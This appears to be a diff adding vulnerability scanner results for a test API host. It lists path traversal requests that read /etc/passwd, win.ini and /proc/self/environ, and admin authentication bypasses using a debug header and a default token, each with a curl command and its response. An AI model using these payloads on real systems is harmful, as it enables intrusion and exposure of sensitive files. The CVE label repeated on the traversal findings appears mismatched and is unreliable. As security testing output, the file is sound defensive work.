@@ -1,0 +1,95 @@
+[
+  {
+    "template-id": "http-path-traversal",
+    "info": {
+      "name": "Generic Path Traversal - Arbitrary File Read",
+      "author": "projectdiscovery",
+      "severity": "high",
+      "description": "Path traversal vulnerability allows unauthorized reading of sensitive local files via unsanitized parameter.",
+      "classification": {
+        "cve-id": "CVE-2023-38606",
+        "cwe-id": ["cwe-22"]
+      }
+    },
+    "type": "http",
+    "host": "https://api.cyberyukti.local",
+    "matched-at": "https://api.cyberyukti.local/api/static/download?file=../../../../etc/passwd",
+    "request": "GET /api/static/download?file=../../../../etc/passwd HTTP/1.1\nHost: api.cyberyukti.local",
+    "response": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash",
+    "curl-command": "curl -X GET 'https://api.cyberyukti.local/api/static/download?file=../../../../etc/passwd'"
+  },
+  {
+    "template-id": "http-path-traversal",
+    "info": {
+      "name": "Generic Path Traversal - Windows Configuration Read",
+      "author": "projectdiscovery",
+      "severity": "high",
+      "description": "Path traversal vulnerability allows reading win.ini on Windows targets.",
+      "classification": {
+        "cve-id": "CVE-2023-38606",
+        "cwe-id": ["cwe-22"]
+      }
+    },
+    "type": "http",
+    "host": "https://api.cyberyukti.local",
+    "matched-at": "https://api.cyberyukti.local/api/static/download?file=..%2f..%2f..%2fwindows%2fwin.ini",
+    "request": "GET /api/static/download?file=..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1\nHost: api.cyberyukti.local",
+    "response": "HTTP/1.1 200 OK\n\n[fonts]\n",
+    "curl-command": "curl -X GET 'https://api.cyberyukti.local/api/static/download?file=..%2f..%2f..%2fwindows%2fwin.ini'"
+  },
+  {
+    "template-id": "http-path-traversal",
+    "info": {
+      "name": "Generic Path Traversal - Proc Self Environ",
+      "author": "projectdiscovery",
+      "severity": "high",
+      "description": "Path traversal vulnerability allows dumping process environment variables via procfs.",
+      "classification": {
+        "cve-id": "CVE-2023-38606",
+        "cwe-id": ["cwe-22"]
+      }
+    },
+    "type": "http",
+    "host": "https://api.cyberyukti.local",
+    "matched-at": "https://api.cyberyukti.local/api/static/download?file=../../../../proc/self/environ",
+    "request": "GET /api/static/download?file=../../../../proc/self/environ HTTP/1.1\nHost: api.cyberyukti.local",
+    "response": "HTTP/1.1 200 OK\n\nPATH=/usr/local/bin:/usr/bin",
+    "curl-command": "curl -X GET 'https://api.cyberyukti.local/api/static/download?file=../../../../proc/self/environ'"
+  },
+  {
+    "template-id": "api-admin-auth-bypass",
+    "info": {
+      "name": "Administrative API Endpoint Authentication Bypass",
+      "author": "projectdiscovery",
+      "severity": "high",
+      "description": "Administrative route is accessible without cryptographic validation when specific headers are provided.",
+      "classification": {
+        "cwe-id": ["cwe-287"]
+      }
+    },
+    "type": "http",
+    "host": "https://api.cyberyukti.local",
+    "matched-at": "https://api.cyberyukti.local/api/admin/auth",
+    "request": "GET /api/admin/auth HTTP/1.1\nHost: api.cyberyukti.local\nX-Debug: true",
+    "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"authenticated\": true, \"role\": \"admin\"}",
+    "curl-command": "curl -X GET 'https://api.cyberyukti.local/api/admin/auth' -H 'X-Debug: true'"
+  },
+  {
+    "template-id": "api-admin-auth-bypass",
+    "info": {
+      "name": "Administrative API Endpoint Session Token Bypass",
+      "author": "projectdiscovery",
+      "severity": "high",
+      "description": "Unauthenticated session granted via default fallback token on admin auth endpoint.",
+      "classification": {
+        "cwe-id": ["cwe-287"]
+      }
+    },
+    "type": "http",
+    "host": "https://api.cyberyukti.local",
+    "matched-at": "https://api.cyberyukti.local/api/admin/auth?token=debug_master",
+    "request": "GET /api/admin/auth?token=debug_master HTTP/1.1\nHost: api.cyberyukti.local",
+    "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"granted\"}",
+    "curl-command": "curl -X GET 'https://api.cyberyukti.local/api/admin/auth?token=debug_master'"
+  }
+]
